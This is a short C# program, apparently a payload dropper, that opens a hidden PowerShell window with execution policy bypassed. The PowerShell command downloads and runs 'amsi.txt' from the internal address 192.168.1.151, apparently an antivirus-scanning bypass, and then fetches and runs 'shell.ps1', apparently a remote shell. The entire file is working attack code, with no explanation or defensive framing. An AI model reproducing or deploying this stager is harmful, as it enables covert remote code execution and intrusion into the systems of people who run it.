using System;
using System.Net;

namespace ExecutableGenerator
{
    public class Program
    {
        public static void Main()
        {
            string cmd = "Invoke-Expression (Invoke-WebRequest -Uri 'http://192.168.1.151/amsi.txt' -UseBasicParsing | Select-Object -ExpandProperty Content); $scriptContent = [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri 'http://192.168.1.151/shell.ps1' -UseBasicParsing).Content); Invoke-Expression $scriptContent";

            var psi = new System.Diagnostics.ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = $"-ExecutionPolicy Bypass -NoProfile -Command \"{cmd}\"";
            psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            System.Diagnostics.Process.Start(psi);
        }
    }
}
